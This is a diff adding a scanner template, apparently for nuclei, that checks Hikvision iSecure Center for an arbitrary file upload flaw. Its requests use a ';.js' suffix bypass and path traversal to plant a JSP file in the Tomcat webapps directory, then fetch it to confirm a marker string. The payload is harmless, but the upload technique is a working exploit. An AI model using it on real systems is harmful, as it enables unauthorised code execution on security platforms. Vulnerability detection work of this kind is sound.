@@ -1,0 +1,37 @@
+id: hikvision-js-files-upload
+
+info:
+  name: 海康威视综合安防管理平台 iSecure Center /center/api/files 任意文件上传
+  author: Superhero
+  severity: critical
+  description: 海康威视综合安防管理平台 iSecure Center /center/api/files存在任意文件上传漏洞
+  tags: files-upload
+  
+http:
+  - raw:
+      - |
+        POST /center/api/files;.js HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxmdzwoe
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
+
+        ------WebKitFormBoundaryxxmdzwoe
+        Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp"
+        Content-Type:image/jpeg
+
+        <%out.println("pboyjnnrfipmplsukdeczudsefxmywe");%>
+        ------WebKitFormBoundaryxxmdzwoe--
+  - raw:
+      - |
+        GET /clusterMgr/ukgmfyufsi.jsp;.js HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
